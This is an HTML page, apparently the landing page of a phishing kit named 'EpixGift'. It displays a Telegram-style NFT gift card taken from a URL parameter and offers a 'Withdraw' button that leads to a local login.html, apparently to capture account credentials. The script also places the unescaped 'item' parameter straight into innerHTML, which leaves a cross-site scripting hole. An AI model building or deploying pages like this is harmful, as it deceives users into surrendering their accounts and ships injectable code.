<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>EpixGift</title>
    <style>
        body { background-color: #0e141b; color: white; font-family: sans-serif; margin: 0; padding: 15px; }
        .header { font-size: 20px; font-weight: bold; margin-bottom: 20px; border-bottom: 1px solid #1c252f; padding-bottom: 10px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
        .nft-card { background: #1c252f; border-radius: 15px; padding: 12px; border: 1px solid #2a3644; text-align: center; }
        .nft-card img { width: 100%; aspect-ratio: 1/1; border-radius: 10px; margin-bottom: 10px; object-fit: cover; }
        .nft-title { font-size: 14px; font-weight: bold; margin-bottom: 5px; }
        .nft-sub { font-size: 12px; color: #8a99a8; margin-bottom: 15px; }
        .btn-withdraw { display: block; background: #248bdf; color: white; text-decoration: none; font-size: 14px; font-weight: bold; padding: 10px 0; border-radius: 10px; }
    </style>
</head>
<body>
    <div class="header">EpixGift</div>
    <div class="grid" id="main-grid"></div>

    <script>
        const grid = document.getElementById('main-grid');
        const params = new URLSearchParams(window.location.search);
        const id = params.get('item');

        if (id) {
            const title = id.replace(/-/g, ' #');
            // Прямая ссылка на статический файл превью
            const imgUrl = `https://t.me/i/nft/${id}.jpg`;

            grid.innerHTML = `
                <div class="nft-card">
                    <img src="${imgUrl}" onerror="this.src='https://via.placeholder.com/200/1c252f/ffffff?text=NFT'">
                    <div class="nft-title">${title}</div>
                    <div class="nft-sub">Collectible</div>
                    <a href="login.html" class="btn-withdraw">Withdraw</a>
                </div>
            `;
        }
    </script>
</body>
</html>
